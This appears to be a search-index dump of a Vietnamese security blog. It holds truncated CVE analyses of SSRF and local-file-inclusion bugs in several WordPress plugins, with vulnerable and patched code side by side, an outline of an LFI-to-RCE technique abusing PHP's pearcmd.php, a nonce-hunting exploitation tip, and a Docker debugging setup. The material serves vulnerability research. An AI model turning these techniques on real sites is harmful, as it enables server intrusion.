if ( !is_wp_error( $response ) ) { $code = wp_remote_retrieve_response_code( $response ); $error = 'Unknown'; } else { $code = 0; $error = $response-\u003eget_error_message(); } } // End check_url_status_code Trong phiên bản lỗi, hàm check_url_status_code() thực hiện việc gọi wp_remote_get() trực tiếp với URL do người dùng cung cấp mà không hề kiểm tra tính hợp lệ hay mức độ an toàn của URL. Điều này tạo ra lỗ hổng SSRF (Server-Side Request Forgery). Phiên bản này không kiểm tra scheme của URL, host có hợp lệ hay không, hay IP có thuộc dải private/reserved, nên mọi request đều được thực hiện mà không có hạn chế. public function check_url_status_code( $url, $timeout = null ) { // Add the home url if ( str_starts_with( $url, '/' ) ) { $link = home_url().$url; } else { $link = $url; } // Block SSRF to private/reserved ranges $unsafe = $this-\u003eis_url_unsafe( $link ); if ( $unsafe ) { return apply_filters( 'blnotifier_status', $unsafe ); } ... // Check the link $response = wp_remote_get( $link, $http_request_args ); if ( !is_wp_error( $response ) ) { $code = wp_remote_retrieve_response_code( $response ); $error = 'Unknown'; } else { $code = 0; $error = $response-\u003eget_error_message(); } } // End check_url_status_code protected function is_url_unsafe( $url ) { $parts = wp_parse_url( $url ); if ( ! isset( $parts[ 'scheme' ], $parts[ 'host' ] ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: invalid or malformed URL', 'link' =\u003e $url ]; } $scheme = strtolower( $parts[ 'scheme' ] ); if ( ! in_array( $scheme, [ 'http', 'https' ], true ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: unsupported URL scheme', 'link' =\u003e $url ]; } $host = $parts[ 'host' ]; $records = @dns_get_record( $host, DNS_A + DNS_AAAA ); $ips = []; if ( is_array( $records ) \u0026\u0026 count( $records ) ) { foreach ( $records as $record ) { if ( isset( $record[ 'type' ] ) \u0026\u0026 $record[ 'type' ] === 'A' \u0026\u0026 ! empty( $record[ 'ip' ] ) ) { $ips[] = $record[ 'ip' ]; } if ( isset( $record[ 'type' ] ) \u0026\u0026 $record[ 'type' ] === 'AAAA' \u0026\u0026 ! empty( $record[ 'ipv6' ] ) ) { $ips[] = $record[ 'ipv6' ]; } } } else { $resolved = gethostbyname( $host ); if ( $resolved \u0026\u0026 $resolved !== $host ) { $ips[] = $resolved; } } if ( empty( $ips ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: host could not be resolved', 'link' =\u003e $url ]; } foreach ( $ips as $ip ) { if ( filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE ) === false ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: resolved to internal or reserved IP address', 'link' =\u003e $url ]; } } return false; // Safe } // End is_url_unsafe() Bản vá đã bổ sung hàm is_url_unsafe(). Trước khi gọi wp_remote_get(), URL được kiểm tra chi tiết: chỉ cho phép scheme ht","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress PopupKit Plugin.","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Popup Builder with Gamification, Multi-Step Popups, Page-Level Targeting, and WooCommerce Triggers cho WordPress tồn tại lỗ hổng Server-Side Request Forgery (SSRF) trong tất cả các phiên bản từ đầu đến 2.1.4 (bao gồm cả 2.1.4). Nguyên nhân là do thiếu kiểm tra hợp lệ (insufficient validation) đối với các URL được truyền thông qua tham số URL. Điều này cho phép kẻ tấn công chưa xác thực (unauthenticated attackers) gửi các web request đến địa chỉ tùy ý xuất phát từ ứng dụng web, có thể được lợi dụng để truy vấn hoặc chỉnh sửa thông tin từ các dịch vụ nội bộ (internal services), cũng như thực hiện hoạt động trinh sát mạng (network reconnaissance). Lỗ hổng này đã được vá một phần (partially patched) trong phiên bản 2.1.4. CVE ID: CVE-2025-10861 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.1.4 Patched Versions: 2.1.5 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress PopupKit Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - PopupKit: 2.1.3 (vulnerable) và 2.1.5 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff Vì 1 phần mã nguồn đã được vá trong phiên bản 2.1.4 nên ta sẽ sử dụng phiên bản 2.1.3 để phân tích. protected function get_routes(): array { return [ [ 'endpoint' =\u003e '/live-preview', 'methods' =\u003e 'POST', 'callback' =\u003e 'fetch_external_content', 'permission_callback' =\u003e '__return_true', ],... ]; } public function fetch_external_content( \\WP_REST_Request $request ) { $url = $request-\u003eget_param( 'url' ); if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Invalid URL' ), 400 ); } // Fetch the content using wp_remote_get $new_url = add_query_arg( 'preview', 'true', $url ); $response = wp_remote_get( $new_url ); if ( is_wp_error( $response ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Error fetching content' ), 500 ); } // Return the fetched content $body = wp_remote_retrieve_body( $response ); $body = preg_replace( '/type=\"[^\"]+-text\\/javascript\"/', 'type=\"text/javascript\"', $body ); return new \\WP_REST_Response( array( 'content' =\u003e $body ), 200 ); } Trong phiên bản 2.1.3, plugin định nghĩa một API với POST method có permission_callback =\u003e __return_true, cho phép mọi người dùng, bao gồm cả anonymous user, thực thi hàm fetch_external_content() với tham số url bắt buộc. Hàm này sử dụng wp_remote_get để gửi request đến URL được truyền vào và trả lại nội dung phản hồi (response body). Do không có bất kỳ cơ chế kiểm soát hoặc lọc URL nội bộ nào, điều này khiến kẻ tấn công có thể gửi request đến các dịch vụ nội bộ (internal services) dẫn đến lỗ hổng Server-Side Request Forgery (SSRF) có thể khai thác bởi anonymous user. protected function get_routes(): array { return [ [ 'endpoint' =\u003e '/live-preview-template', 'methods' =\u003e 'GET', 'callback' =\u003e 'fetch_external_content', ],... ]; } public function fetch_external_content( \\WP_REST_Request $request ) { $url = $request-\u003eget_param( 'url' ); if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Invalid URL' ), 400 ); } // Fetch the content using wp_remote_get $new_url = add_query_arg( 'preview', 'true', $url ); $response = wp_safe_remote_get( $new_url ); if ( is_wp_error( $response ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Error fetching content' ), 500 ); } // Return the fetched content $body = wp_remote_retrieve_body( $response ); $body = preg_replace( '/type=\"[^\"]+-text\\/javascript\"/', 'type=\"text/javascript\"', $body ); return new \\WP_REST_Response( array( 'content' =\u003e $body ), 200 ); } Trong bản vá 2.1.5, plugin đã thực hiện một số thay đổi nhằm giảm thiểu nguy cơ Server-Side Request Forgery (SSRF): Đổi endpoint từ /live-preview sang /live-preview-template. Thay thế hàm wp_remote_get() bằng wp_safe_remote_get(), giúp WordPress tự động chặn các request","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Spectra Plugin.","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Lỗ hổng Server Side Request Forgery (SSRF) đã được phát hiện trong plugin WordPress Spectra (trước đây gọi là Ultimate Addons cho Gutenberg) ảnh hưởng đến các phiên bản lên tới 2.6.6. CVE ID: CVE-2023-36679 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.6.6 Patched Versions: 2.6.7 CVSS severity: Low (7.1) Required Privilege: Contributor Product: WordPress Spectra Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Spectra: 2.6.6 (vulnerable) và 2.6.7 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff Bản lỗi: public function template_importer() { if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } // Verify Nonce. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); // other logic $api_args = apply_filters( 'ast_block_templates_api_args', array( 'timeout' =\u003e 15, ) ); $api_uri = ( isset( $_REQUEST['api_uri'] ) ) ? esc_url_raw( $_REQUEST['api_uri'] ) : ''; $request_params = apply_filters( 'ast_block_templates_api_params', array( '_fields' =\u003e 'original_content', ) ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); // API Call. $response = wp_remote_get( $demo_api_uri, $api_args ); // other logic $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); } Trong phiên bản 2.6.6, hàm template_importer() nhận tham số api_uri trực tiếp từ biến $_REQUEST và sử dụng giá trị này để gửi HTTP request thông qua hàm wp_remote_get(): Do không có bước xác thực hoặc giới hạn nguồn, kẻ tấn công có thể cung cấp một URL tùy ý để ép máy chủ thực hiện request đến các địa chỉ nội bộ. Điều này tạo ra lỗ hổng Server-Side Request Forgery (SSRF). Bản vá: public function template_importer() { if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } // Verify Nonce. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); // other logic $api_args = apply_filters( 'ast_block_templates_api_args', array( 'timeout' =\u003e 15, ) ); $block_id = isset( $_REQUEST['id'] ) ? absint( $_REQUEST['id'] ) : ''; $block_data = get_option( 'ast-block-templates_data-' . $block_id ); $api_uri = null !== $block_data ? $block_data-\u003e{'astra-page-api-url'} : ''; $request_params = apply_filters( 'ast_block_templates_api_params', array( '_fields' =\u003e 'original_content', ) ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); // API Call. $response = wp_remote_get( $demo_api_uri, $api_args ); // other logic $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); } Bản vá đã loại bỏ việc nhận URL trực tiếp từ người dùng. Thay vào đó, mã chỉ nhận ID của block thông qua $_REQUEST['id'] và truy xuất URL tương ứng từ cơ sở dữ liệu (wp_options) bằng khóa ast-block-templates_data-{id}: Nhờ đó, URL được giới hạn trong các bản ghi được quản lý sẵn trong hệ thống, loại bỏ khả năng người dùng tự cung cấp đường dẫn tùy ý. Cơ chế này giúp ngăn chặn hoàn toàn nguy cơ SSRF và tăng tính an toàn khi gọi API từ phía máy chủ. Vulnerable Code template_importer() yêu cầu người dùng có đặc quyền từ Contributor trở lên if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } Xác thực nonce chống csrf với tên nonce là _ajax_nonce, nếu nonce không khớp =\u003e thoát khỏi logic và gửi lỗi. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); Mẹo Lỗ hổng được công bố yêu cầu đặc quyền Contributor, nên giá trị _ajax_nonce rất có khả năng xuất hiện trong mã nguồn giao diện Admin. Với các lỗ hổng liên quan tới quyền Contributor thường gắn với chức năng tạo bài viết, bạn có thể tìm _ajax_n","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/"},{"categories":["CVE Analyst"],"content":"Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/"},{"categories":["CVE Analyst"],"content":"Xin chào. Sau khi phân tích 10 CVE liên quan đến LFI trên các plugin WordPress, tôi nhận thấy một rào cản chung: nhiều vector khai thác bị giới hạn bởi yêu cầu phải có hậu tố .php. Điều này làm giảm đáng kể khả năng khai thác. Trong quá trình tìm hiểu, tôi tìm thấy bài viết docker-php-include-getshell. Bài đó mô tả cách bypass ràng buộc .php bằng cách lợi dụng file pearcmd.php vốn nằm trong bộ công cụ PECL/PEAR của PHP và có sẵn trong môi trường WordPress được triển khai trên Docker - một mẹo rất thực tế cho kịch bản không cho upload file. PEAR và PECL là gì? PECL (PHP Extension Community Library): công cụ dòng lệnh để cài và quản lý extension PHP. PEAR (PHP Extension and Application Repository): thư viện nền tảng cho PECL. Trước PHP 7.3, PEAR/PECL thường được cài mặc định. Từ PHP 7.4 trở đi, cần biên dịch PHP với --with-pear để có chúng. Tuy nhiên, trong các Docker image PHP chính thức, PEAR/PECL vẫn thường được cài sẵn, nằm ở /usr/local/lib/php: root@e182501c47c4:/var/www/html# ls /usr/local/lib/php Archive Console OS PEAR PEAR.php Structures System.php XML build data doc extensions pearcmd.php peclcmd.php test pearcmd.php và register_argc_argv pearcmd.php là một script PHP thiết kế để chạy ở chế độ dòng lệnh, ví dụ: php /usr/local/lib/php/pearcmd.php install somepackage Nó xử lý các tham số từ $argv và $argc. Khi chạy như CLI thì dữ liệu này rõ ràng. Nếu file này được include trong bối cảnh web (do LFI), logic CLI của nó có thể bị lợi dụng. Điểm then chốt là cấu hình register_argc_argv. Nếu register_argc_argv = On, PHP sẽ tạo: $argc $argv $_SERVER['argv'] `argv` trong cấu hình PHP Khi thiết lập WordPress trên Docker, register_argc_argv thường bật mặc định. Vấn đề đặt ra: khi PHP chạy dưới SAPI web (FPM/Apache) và không phải CLI, $argv lấy dữ liệu từ đâu? Analysis PHP Source Code Trong PHP core có logic như sau: if (PG(register_argc_argv)) { if (SG(request_info).argc) { ... } else { php_build_argv(SG(request_info).query_string, \u0026PG(http_globals)[TRACK_VARS_SERVER]); } } Nếu không có argc (không chạy CLI), PHP gọi php_build_argv với SG(request_info).query_string - tức query string của URL. Ví dụ: http://example.com/index.php?a=b\u0026c=d → query_string = \"a=b\u0026c=d\" PHP sẽ dùng query string này để tạo biến argv, do đó $_SERVER['argv'] có thể bị ảnh hưởng bởi query string. Hậu quả: Khi pearcmd.php được include qua LFI trong môi trường web mà $_SERVER['argv'] được sinh từ query string, attacker có thể điều khiển các tham số dòng lệnh mà pearcmd.php đọc được. Do đó, chức năng dòng lệnh của PEAR/PECL có thể bị lợi dụng qua web để thực hiện hành động không mong muốn. RFC3875 Explain RFC3875 (CGI spec) định nghĩa một dạng “indexed” HTTP query - tức là chuỗi truy vấn không chứa dấu = chưa mã hóa và được gửi qua phương thức GET hoặc HEAD. Khi gặp loại truy vấn này, server nên (SHOULD) coi phần query-string như một search-string, tách thành các search-word bằng dấu +: search-string = search-word ( \"+\" search-word ) search-word = 1*schar Sau khi tách, mỗi search-word sẽ được URL-decode, có thể mã hóa lại theo hệ thống, rồi thêm vào danh sách đối số dòng lệnh (argv) của chương trình CGI. Nói ngắn gọn: nếu query-string không có dấu = và là yêu cầu GET hoặc HEAD, máy chủ có thể coi các phần ngăn cách bằng + như các tham số dòng lệnh và truyền vào argv. RFC3875 cho phép server biến một query-string “indexed” (GET/HEAD, không có ký tự = chưa mã hóa) thành danh sách từ, rồi đưa vào argv. Phần mô tả trong tiêu chuẩn như sau: 4.4. The Script Command Line Some systems support a method for supplying an array of strings to the CGI script. This is only used in the case of an 'indexed' HTTP query, which is identified by a 'GET' or 'HEAD' request with a URI query string that does not contain any unencoded \"=\" characters. For such a request, the server SHOULD treat the query-string as a search-string and parse it into words, using the rules search-string = search-word ( \"+\" search-word ) search-word = 1*schar schar = unreserved | escaped | xreserved xreserv","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:0:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Essential Blocks for Gutenberg Plugin.","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Gutenberg Essential Blocks – Page Builder for Gutenberg Blocks \u0026 Patterns cho WordPress bị lỗ hổng Server-Side Request Forgery (SSRF) trong tất cả các phiên bản lên tới và bao gồm 5.7.1, thông qua hàm eb_save_ai_generated_image. Điều này cho phép kẻ tấn công đã xác thực, có quyền Author-level trở lên, thực hiện các yêu cầu web tới bất kỳ địa chỉ nào xuất phát từ ứng dụng web và có thể bị lợi dụng để truy vấn và chỉnh sửa thông tin từ các dịch vụ nội bộ. CVE ID: CVE-2025-11361 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.7.1 Patched Versions: 5.7.2 CVSS severity: Low (5.5) Required Privilege: Author Product: WordPress Essential Blocks for Gutenberg Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Essential Blocks for Gutenberg: 5.7.1 (vulnerable) và 5.7.2 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff Bản lỗi: public function eb_save_ai_generated_image() { if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } // Check if we have either image_url or image_b64 along with prompt if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) { $image_url = isset( $_POST[ 'image_url' ] ) ? esc_url_raw( $_POST[ 'image_url' ] ) : null; $image_body = ''; // Handle URL format if ( $image_url ) { // Download the image from OpenAI URL $image_data = wp_remote_get( $image_url, [ 'timeout' =\u003e 60 ] ); if ( is_wp_error( $image_data ) ) { wp_send_json_error( [ 'message' =\u003e __( 'Failed to download image from OpenAI.', 'essential-blocks' ) ] ); return; } // Detect image format and set appropriate extension and MIME type $image_info = getimagesizefromstring( $image_body ); $mime_type = $image_info ? $image_info[ 'mime' ] : 'image/png'; // Determine file extension based on MIME type $extension = 'png'; // default switch ( $mime_type ) { case 'image/jpeg': $extension = 'jpg'; break; case 'image/png': $extension = 'png'; break; case 'image/webp': $extension = 'webp'; break; case 'image/gif': $extension = 'gif'; break; } $image_body = wp_remote_retrieve_body( $image_data ); } // other logic } else { wp_send_json_error( __( 'Image data (URL or base64) and prompt are required', 'essential-blocks' ) ); } } Trong phiên bản lỗi, sử dụng wp_remote_get($image_url) để tải hình ảnh mà không xác thực hoặc giới hạn nguồn URL. Không kiểm tra mã phản hồi HTTP, MIME type hay nội dung thực tế của tệp trả về, khiến kẻ tấn công có thể lợi dụng gửi yêu cầu SSRF đến các dịch vụ nội bộ hoặc tải về dữ liệu độc hại giả dạng hình ảnh. Bản vá: public function eb_save_ai_generated_image() { if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } // Check if we have either image_url or image_b64 along with prompt if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) { $image_url = isset( $_POST[ 'image_url' ] ) ? esc_url_raw( $_POST[ 'image_url' ] ) : null; $image_body = ''; // Handle URL format if ( $image_url ) { // Download the image from validated URL $image_data = wp_safe_remote_get( $image_url, [ 'timeout' =\u003e 30, 'redirection' =\u003e 3, 'user-agent' =\u003e 'Essential Blocks/' . ESSENTIAL_BLOCKS_VERSION, 'headers' =\u003e [ 'Accept' =\u003e 'image/*' ] ] ); if ( is_wp_error( $image_data ) ) { wp_send_json_error( [ 'message' =\u003e __( 'Failed to download image from URL","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/"},{"categories":["Web"],"content":"A powerful and the most popular content management system (CMS).","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/"},{"categories":["Web"],"content":"Tiếp nối phần hướng dẫn cài đặt WordPress trên môi trường local ở bài viết trước, bài này sẽ hướng dẫn bạn thiết lập WordPress bằng Docker — một cách hiện đại, linh hoạt và dễ chia sẻ hơn. Why Use Docker? Docker cho phép bạn đóng gói toàn bộ môi trường chạy WordPress (PHP, MySQL, web server và mã nguồn) vào các container độc lập. Cách làm này mang lại nhiều lợi ích: Đồng nhất môi trường: Chạy giống nhau trên mọi máy, tránh lỗi “chạy được trên máy tôi”. Dễ cài đặt và tái tạo: Chỉ cần vài lệnh để khởi tạo hoặc reset toàn bộ hệ thống. Cách ly và an toàn: Mỗi container là một môi trường riêng, tránh xung đột phần mềm. Thuận tiện cho phát triển và debug: Có thể bật Xdebug, theo dõi log, hoặc chỉnh PHP mà không ảnh hưởng đến hệ thống chính. Dễ chia sẻ: Chỉ cần gửi file docker-compose.yml và các file cấu hình, người khác có thể khởi chạy cùng môi trường giống bạn — không cần cài đặt thủ công. Docker là giải pháp tối ưu để phát triển, thử nghiệm và cộng tác trên các dự án WordPress, đặc biệt hữu ích cho lập trình viên, nhóm làm việc hoặc người làm pentest muốn có môi trường nhất quán, dễ tái sử dụng. Setup WordPress for Hacker in Docker Prerequisites Docker Trước tiên, bạn cần cài đặt Docker. Công cụ này hỗ trợ trên nhiều hệ điều hành, mỗi nền tảng có cách cài đặt riêng. Xem hướng dẫn tại: https://www.docker.com/get-started/ Docker Compose Thay vì chạy từng container thủ công bằng docker run, ta dùng Docker Compose để định nghĩa và quản lý nhiều container liên kết chỉ bằng một file cấu hình duy nhất (docker-compose.yml). Với WordPress, ta cần: Một container MySQL để lưu cơ sở dữ liệu. Một container WordPress (PHP + web server) để chạy mã nguồn. Nếu làm thủ công, bạn sẽ phải nhập nhiều lệnh và cấu hình phức tạp. Với Docker Compose, tất cả nằm trong một file YAML giúp: Dễ cài đặt: docker-compose up -d là có đủ WordPress + MySQL. Dễ chia sẻ: Người khác chỉ cần cùng file docker-compose.yml là chạy được. Dễ mở rộng: Thêm phpMyAdmin, Nginx, hoặc Xdebug chỉ cần vài dòng. Xem hướng dẫn cài Docker Compose tại: https://docs.docker.com/compose/install/ Installing WordPress with Docker Compose and Xdebug Phần này hướng dẫn cài WordPress với Docker Compose, tích hợp Xdebug để debug trực tiếp trong VS Code. Cách này giúp bạn có môi trường phát triển đầy đủ, dễ gỡ lỗi và mở rộng. Cấu trúc thư mục: . ├── wordpress ├── docker-compose.yml ├── Dockerfile ├── php.ini └── .vscode └── launch.json Setup Environment Tạo thư mục mới để chứa toàn bộ cấu hình: mkdir wordpress-docker \u0026\u0026 cd wordpress-docker Create Dockerfile Image WordPress mặc định chưa có Xdebug, nên ta mở rộng bằng Dockerfile. nano Dockerfile Nội dung: FROM wordpress:latest # Cài đặt Xdebug RUN pecl install xdebug \u0026\u0026 docker-php-ext-enable xdebug Create docker-compose.yml Tạo file để cấu hình toàn bộ hệ thống: nano docker-compose.yml Nội dung: services: db: image: mysql:latest container_name: wp_db restart: always environment: MYSQL_ROOT_PASSWORD: root MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress volumes: - db_data:/var/lib/mysql wordpress: build: . container_name: wp_app depends_on: - db ports: - \"80:80\" restart: always environment: WORDPRESS_DB_HOST: db:3306 WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress WORDPRESS_DB_NAME: wordpress volumes: - ./wordpress:/var/www/html - ./php.ini:/usr/local/etc/php/conf.d/php.ini volumes: db_data: Thông tin volumes: dùng để lưu trữ dữ liệu và đồng bộ mã nguồn giữa máy thật và container. Giải thích: db_data:/var/lib/mysql Lưu dữ liệu MySQL bền vững, không mất khi xóa container. ./wordpress:/var/www/html Đồng bộ mã nguồn WordPress giữa máy và container, giúp sửa code trực tiếp. ./php.ini:/usr/local/etc/php/conf.d/php.ini Gắn file cấu hình PHP/Xdebug, dễ tùy chỉnh mà không cần rebuild image. Create php.ini Kích hoạt Xdebug và cấu hình PHP. nano php.ini Nội dung: zend_extension=xdebug xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=172.17.0.1 xdebug.client_port=9003 xdebug.log_level=0 upload_max_file","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:0:0","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress MasterStudy LMS Plugin.","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin MasterStudy LMS phiên bản ≤ 3.5.28 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-32141 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 3.5.28 Patched Versions: 3.5.29 CVSS severity: Low (8.8) Required Privilege: Contributor Product: WordPress MasterStudy LMS Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - MasterStudy LMS: 3.5.28 (vulnerable) và 3.5.29 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff Bản lỗi: \u003c?php add_shortcode( 'stm_lms_courses_categories', 'stm_lms_courses_categories_shortcode' ); function stm_lms_courses_categories_shortcode( $atts ) { $atts = shortcode_atts( array( 'taxonomy' =\u003e '', 'style' =\u003e 'style_1', ), $atts ); ob_start(); STM_LMS_Templates::stm_lms_load_vc_element( 'courses_categories', $atts, $atts['style'] ); return ob_get_clean(); } Trong phiên bản lỗi, callback của shortcode stm_lms_courses_categories lấy trực tiếp giá trị style từ mảng $atts và truyền thẳng vào STM_LMS_Templates::stm_lms_load_vc_element() mà không có bất kỳ kiểm tra hay làm sạch đầu vào nào =\u003e LFI có thể xảy ra. Bản vá: \u003c?php add_shortcode( 'stm_lms_courses_categories', 'stm_lms_courses_categories_shortcode' ); function stm_lms_courses_categories_shortcode( $atts, $content = null, $tag = '' ) { $atts = shortcode_atts( array( 'taxonomy' =\u003e '', 'style' =\u003e 'style_1', ), $atts, $tag ); $atts['style'] = basename( sanitize_file_name( $atts['style'] ) ); ob_start(); STM_LMS_Templates::stm_lms_load_vc_element( 'courses_categories', $atts, $atts['style'] ); return ob_get_clean(); } Bản vá đã sanitize $atts['style'] bằng sanitize_file_name() đã loại bỏ chuỗi/ký tự không an toàn =\u003e ngăn chặn LFI. Vulnerable Code public static function stm_lms_load_vc_element( $__template, $__vars = array(), $__template_name = '', $custom_path = '' ) { extract( $__vars ); // phpcs:ignore WordPress.PHP.DontExtract $element = self::stm_lms_locate_vc_element( $__template, $__template_name, $custom_path ); if ( ! file_exists( $element ) \u0026\u0026 strpos( $__template_name, 'style_' ) !== false ) { $element = str_replace( $__template_name, 'style_1', $element ); } if ( file_exists( $element ) ) { include $element; } else { echo esc_html__( 'Element not found in', 'masterstudy-lms-learning-management-system' ); echo esc_html( ' ' . $element ); } } Hàm include() tại đây dùng biến $element do stm_lms_locate_vc_element() trả về và $__template_name (tức giá trị style từ shortcode) ảnh hưởng trực tiếp tới kết quả đó. Nếu style không được xác thực, attacker có thể ép include file tùy ý dẫn đến LFI. public static function stm_lms_locate_vc_element( $templates, $template_name = '', $custom_path = '' ) { $located = false; foreach ( (array) $templates as $template ) { $folder = $template; if ( ! empty( $template_name ) ) { $template 